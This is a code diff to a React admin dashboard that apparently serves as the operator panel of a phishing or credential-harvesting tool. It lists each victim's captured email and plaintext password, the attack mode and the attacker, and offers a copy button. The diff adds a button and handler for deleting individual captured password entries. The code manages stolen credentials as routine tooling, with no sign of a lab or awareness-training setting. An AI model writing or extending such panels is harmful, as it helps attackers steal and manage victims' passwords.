@@ -1,5 +1,4 @@
 
-
       
 "use client";
 
@@ -216,6 +215,26 @@ export function AdminDashboard() {
     }
   };
 
+  const handleDeletePassword = async (passwordId: string) => {
+    if (window.confirm("Are you sure you want to delete this password entry?")) {
+      try {
+        const res = await fetch("/api/state", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "deletePassword", passwordId }),
+        });
+        if (res.ok) {
+          toast({ title: "Password Deleted", description: "The entry has been removed." });
+          fetchState();
+        } else {
+          throw new Error("Failed to delete password");
+        }
+      } catch (error) {
+        toast({ variant: "destructive", title: "Error", description: "Could not delete password." });
+      }
+    }
+  };
+
   const handleResetVictimState = async () => {
     if (window.confirm("Are you sure you want to reset the victim's session? All captured data for this session will be cleared, but your configuration will be kept.")) {
       try {
@@ -296,7 +315,9 @@ export function AdminDashboard() {
   };
 
   const attackLog = getAttackLog();
-  const capturedPasswords = state?.victim.passwords ? Object.values(state.victim.passwords) : [];
+  const capturedPasswords = state?.victim.passwords ? 
+    Object.entries(state.victim.passwords).map(([id, data]) => ({ id, ...data })) 
+    : [];
 
   return (
     <div className="w-full max-w-6xl mx-auto p-2 sm:p-4">
@@ -444,15 +465,15 @@ export function AdminDashboard() {
                                         <TableHead>Attack Mode</TableHead>
                                         <TableHead>Attacker</TableHead>
                                         <TableHead className="w-[150px] sm:w-[200px]">Timestamp</TableHead>
-                                        <TableHead className="text-right w-[80px]">Actions</TableHead>
+                                        <TableHead className="text-right w-[120px]">Actions</TableHead>
                                     </TableRow>
                                 </TableHeader>
                                 <TableBody>
                                     {capturedPasswords.length > 0 ? (
-                                        capturedPasswords.map((p, i) => {
+                                        capturedPasswords.map((p) => {
                                             const date = new Date(p.timestamp);
                                             return (
-                                                <TableRow key={i}>
+                                                <TableRow key={p.id}>
                                                     <TableCell className="font-mono text-sm break-all">{p.email}</TableCell>
                                                     <TableCell className="font-mono text-sm break-all">{p.value}</TableCell>
                                                     <TableCell><Badge variant="outline">{p.attackMode}</Badge></TableCell>
@@ -463,6 +484,9 @@ export function AdminDashboard() {
                                                     <TableCell className="text-right">
                                                       <Button variant="ghost" size="icon" onClick={() => copyToClipboard(p.value)}>
                                                           <Clipboard className="h-4 w-4" />
+                                                      </Button>
+                                                      <Button variant="ghost" size="icon" onClick={() => handleDeletePassword(p.id)}>
+                                                          <Trash2 className="h-4 w-4 text-destructive" />
                                                       </Button>
                                                     </TableCell>
                                                 </TableRow>
